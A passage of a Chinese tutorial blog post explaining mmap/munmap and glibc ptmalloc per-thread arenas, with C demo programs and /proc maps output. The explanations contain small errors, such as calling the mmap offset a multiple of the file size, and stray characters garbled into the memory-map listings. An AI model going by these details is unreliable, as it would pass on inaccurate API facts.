getchar();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mmap</code> 和 <code>munmap</code> 是在 Unix 和类 Unix 操作系统中用于内存管理的两个系统调用，它们允许程序映射文件或设备到进程的地址空间，以及撤销这种映射。这些调用通常用于实现内存映射文件，这是一种高效的文件 I&#x2F;O 方法，也可以用于动态内存分配。</p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><h5 id="mmap-1"><a href="#mmap-1" class="headerlink" title="mmap"></a><code>mmap</code></h5><p><code>mmap</code> 系统调用用于将一个文件或者其他对象映射到进程的地址空间。这允许程序像访问普通内存一样访问文件内容，而不需要使用传统的 read 和 write 系统调用。<code>mmap</code> 的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>addr</code>：映射区域的起始地址，通常设置为 NULL 让系统选择地址。</li><li><code>length</code>：映射区域的长度。</li><li><code>prot</code>：映射区域的保护方式，可以是以下几种方式的组合：PROT_EXEC（可执行）、PROT_READ（可读）、PROT_WRITE（可写）、PROT_NONE（不可访问）。</li><li><code>flags</code>：映射类型和属性的标志，常用的标志包括 MAP_SHARED（对映射区域的修改会反映到文件上）、MAP_PRIVATE（私有的copy-on-write映射）、MAP_ANONYMOUS（匿名映射，不与任何文件关联）等。</li><li><code>fd</code>：被映射文件的文件描述符，如果是匿名映射则设置为 -1。</li><li><code>offset</code>：文件映射的起始位置，通常为文件大小的整数倍。</li></ul><p><code>mmap</code> 返回值是映射区域的起始地址，如果失败则返回 MAP_FAILED（通常是(void *)-1）。</p><h5 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a><code>munmap</code></h5><p><code>munmap</code> 系统调用用于撤销由 <code>mmap</code> 创建的内存映射。<code>munmap</code> 的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>addr</code>：要撤销映射的起始地址。</li><li><code>length</code>：要撤销映射的长度，必须与原始 <code>mmap</code> 调用时的长度一致。</li></ul><p><code>munmap</code> 返回值是 0 表示成功，-1 表示失败，并设置 errno 以指示错误原因。</p><h5 id="区别和用途"><a href="#区别和用途" class="headerlink" title="区别和用途"></a>区别和用途</h5><ul><li><code>mmap</code> 用于创建内存映射，可以用于文件 I&#x2F;O、动态内存分配、共享内存等。</li><li><code>munmap</code> 用于撤销已有的内存映射，释放之前 <code>mmap</code> 分配的内存空间。</li><li>使用 <code>mmap</code> 和 <code>munmap</code> 可以提高程序的性能，因为它们允许程序直接在内存中读写文件内容，减少了数据复制的开销。</li><li><code>mmap</code> 还可以用于实现跨进程的内存共享，因为多个进程可以映射同一个文件，从而共享文件内容。</li><li><code>munmap</code> 必须在不再需要映射时调用，以避免内存泄漏。</li></ul><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Private anonymous mapping example using mmap syscall */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg)</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s failed. Exiting the process\n&quot;</span>, msg);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">int</span> ret = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before mmap\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-type">char</span>* addr = <span class="hljs-literal">NULL</span>;<br>        addr = mmap(<span class="hljs-literal">NULL</span>, (<span class="hljs-type">size_t</span>)<span class="hljs-number">132</span>*<span class="hljs-number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>                errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After mmap\n&quot;</span>);<br>        getchar();<br><br>        <span class="hljs-comment">/* Unmap mapped region. */</span><br>        ret = munmap(addr, (<span class="hljs-type">size_t</span>)<span class="hljs-number">132</span>*<span class="hljs-number">1024</span>);<br>        <span class="hljs-keyword">if</span>(ret == <span class="hljs-number">-1</span>)<br>                errExit(<span class="hljs-string">&quot;munmap&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After munmap\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>在执行 mmap 之前</strong></p><p>我们可以从下面的输出看到，目前只有. so 文件的 mmap 段。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="hljs-number">6067</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>在这b<span class="hljs-number">7e21000</span>-b<span class="hljs-number">7e22000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><p><strong>mmap 后</strong></p><p>从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了 b7e00000 到 b7e21000 的 mmap 段。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="hljs-number">6067</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>在这b<span class="hljs-number">7e00000</span>-b<span class="hljs-number">7e22000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><p><strong>munmap</strong></p><p>从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子了。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="hljs-number">6067</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>在这b<span class="hljs-number">7e21000</span>-b<span class="hljs-number">7e22000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是<strong>支持了多线程的快速访问</strong>。在新的实现中，所有的线程共享<strong>多个堆</strong>。</p><p>这里给出一个例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Per thread arena example. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">threadFunc</span><span class="hljs-params">(<span class="hljs-type">void</span>* arg)</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before malloc in thread 1\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-type">char</span>* addr = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After malloc and before free in thread 1\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-built_in">free</span>(addr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After free in thread 1\n&quot;</span>);<br>        getchar();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">pthread_t</span> t1;<br>        <span class="hljs-type">void</span>* s;<br>        <span class="hljs-type">int</span> ret;<br>        <span class="hljs-type">char</span>* addr;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before malloc in main thread\n&quot;</span>);<br>        getchar();<br>        addr = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After malloc and before free in main thread\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-built_in">free</span>(addr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After free in main thread\n&quot;</span>);<br>        getchar();<br>        ret = pthread_create(&amp;t1, <span class="hljs-literal">NULL</span>, threadFunc, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span>(ret)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread creation error\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        ret = pthread_join(t1, &amp;s);<br>        <span class="hljs-keyword">if</span>(ret)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread join error\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pthread_create</code> 是 POSIX 线程库中用于创建新线程的函数。它是 POSIX 线程（pthread）标准的一部分，该标准定义了在多线程程序中创建和管理线程的方法。<code>pthread_create</code> 函数允许程序并行地执行多个线程，从而提高程序的效率和响应能力。</p><p>函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_create</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *thread, <span class="hljs-type">const</span> <span class="hljs-type">pthread_attr_t</span> *attr,<span class="hljs-type">void</span> *(*startroutine)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg)</span>;<br></code></pre></td></tr></table></figure><p>参数说明：</p><ol><li><code>pthread_t *thread</code>：这是一个指向 <code>pthread_t</code> 类型的指针，用于存储新创建线程的标识符。如果线程成功创建，这个变量将被赋予一个唯一的线程ID。</li><li><code>const pthread_attr_t *attr</code>：这是一个指向 <code>pthread_attr_t</code> 类型的指针，它指定了线程的属性。如果设置为 <code>NULL</code>，则使用默认的线程属性。</li><li><code>void *(*startroutine)(void *)</code>：这是新线程开始执行时调用的函数。它是一个函数指针，指向一个接受 <code>void*</code> 类型参数并返回 <code>void*</code> 类型值的函数。</li><li><code>void *arg</code>：这是传递给 <code>startroutine</code> 函数的参数。</li></ol><p>返回值：</p><ul><li><code>0</code>：表示线程成功创建。</li><li>非零值：表示创建线程失败，错误代码会说明具体的错误原因。</li></ul><p><strong>第一次申请之前</strong>， 没有任何任何堆段。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>b<span class="hljs-number">7e05000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>第一次申请后</strong>， 从下面的输出可以看出，堆段被建立了，并且它就紧邻着数据段，这说明 malloc 的背后是用 brk 函数来实现的。同时，需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了 0x0806c000-0x0804b000&#x3D;0x21000 个字节的堆。<strong>这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong>我们称这一块连续的内存区域为 <strong>arena</strong>。此外，我们称由主线程申请的内存为 <strong>main_arena</strong>。后续的申请的内存会一直从这个 <strong>arena</strong> 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>./mthread<br><span class="hljs-title class_">Welcome</span> to per thread arena example::<span class="hljs-number">6501</span><br><span class="hljs-title class_">Before</span> malloc <span class="hljs-keyword">in</span> main thread<br><span class="hljs-title class_">After</span> malloc <span class="hljs-keyword">and</span> before free <span class="hljs-keyword">in</span> main thread<br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/lsploits/hof/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>cat /<span class="hljs-built_in">proc</span>/<span class="hljs-number">6501</span>/maps<br>08048000-08049000 r-xp <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p <span class="hljs-number">00001000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b7e05000-b7e07000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在主线程释放内存后</strong>，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>./mthread<br><span class="hljs-title class_">Welcome</span> to per thread arena example::<span class="hljs-number">6501</span><br><span class="hljs-title class_">Before</span> malloc <span class="hljs-keyword">in</span> main thread<br><span class="hljs-title class_">After</span> malloc <span class="hljs-keyword">and</span> before free <span class="hljs-keyword">in</span> main thread<br><span class="hljs-title class_">After</span> free <span class="hljs-keyword">in</span> main thread<br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/lsploits/hof/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>cat /<span class="hljs-built_in">proc</span>/<span class="hljs-number">6501</span>/maps<br>08048000-08049000 r-xp <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p <span class="hljs-number">00001000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b7e05000-b7e07000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在第一个线程 malloc 之前</strong>，我们可以看到并没有出现与线程 1 相关的堆，但是出现了与线程 1 相关的栈。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread <span class="hljs-number">1</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804b000</span>-<span class="hljs-number">0806c000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b<span class="hljs-number">7604000</span>-b<span class="hljs-number">7605000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7605000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [stack:<span class="hljs-number">6594</span>]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>第一个线程 malloc 后</strong>， 我们可以从下面输出看出线程 1 的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是 132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为**mmap **函数。同时，我们可以看出实际真的分配给程序的内存为 1M(b7500000-b7600000)。而且，只有 132KB 的部分具有可读可写权限，这一块连续的区域成为 <strong>thread arena。</strong></p><p>注意：</p><blockquote><p><strong>当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时</strong>，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p></blockquote><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread <span class="hljs-number">1</span><br>After malloc and before free in thread <span class="hljs-number">1</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span 